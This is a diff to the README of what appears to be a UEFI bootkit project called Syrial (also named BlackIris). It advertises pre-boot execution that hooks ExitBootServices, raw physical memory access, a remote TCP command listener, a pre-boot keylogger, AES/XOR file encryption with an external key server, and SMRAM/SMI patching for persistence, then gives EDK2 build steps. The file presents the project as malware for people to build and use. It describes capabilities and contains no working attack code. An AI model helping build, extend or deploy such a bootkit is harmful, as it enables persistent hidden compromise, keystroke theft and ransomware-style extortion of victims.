@@ -37,3 +37,52 @@ src/
 ├── Shared/ ← Logging, memory utils, EFI wrappers, syscall bridge
 └── Syrial.inf ← UEFI build descriptor for EDK2
 ```
+
+## aFckingFeatures
+
+-  **UEFI Runtime Execution**  
+  Syrial executes before the operating system, hooking `ExitBootServices` and maintaining control from DXE to runtime.
+
+-  **Physical Memory Mapping**  
+  Using `MmMapIoSpace()`, Syrial accesses physical memory with full privileges.
+
+-  **Command Execution & Remote Control**  
+  Custom TCP/command listener in UEFI context with support for remote operation modules.
+
+-  **UEFI-Level Keylogger**  
+  Records keystrokes during pre-boot, EFI Shell, or early OS boot time.
+
+-  **Filesystem Encryption Engine**  
+  AES-256 and XOR-based encryptor for files and logs, handled in `Encryptor/`.
+
+-  **External Key Server**  
+  Key delivery and AES/XOR updates powered by a backend written in Node.js/C++/C#.
+
+-  **Persistent Loader**  
+  Loader handles SMRAM/SMI patching and launches `KernelMain` from mapped runtime region.
+
+-  **Custom EDK2 Build**  
+  Fully EDK2-compatible with clean `.inf`, separate compilation units, and logical linking.
+
+---
+
+## 🔧 Build Instructions
+
+> BlackIris is intended to be compiled with [EDK2](https://github.com/tianocore/edk2) under a UEFI development environment.
+
+### Dependencies
+
+- EDK2 environment (Windows/Linux)
+- GCC or CLANG cross compiler (targeting `x86_64`)
+- Node.js (for backend server)
+- g++ (for key rotator)
+- .NET SDK (for Windows client)
+
+### Compilation
+
+1. Clone the repo and place it in your EDK2 workspace.
+2. Update your `target.txt` to include the path to `Syrial.inf`.
+3. Build with:
+
+```bash
+build -a X64 -p Syrial/Syrial.inf
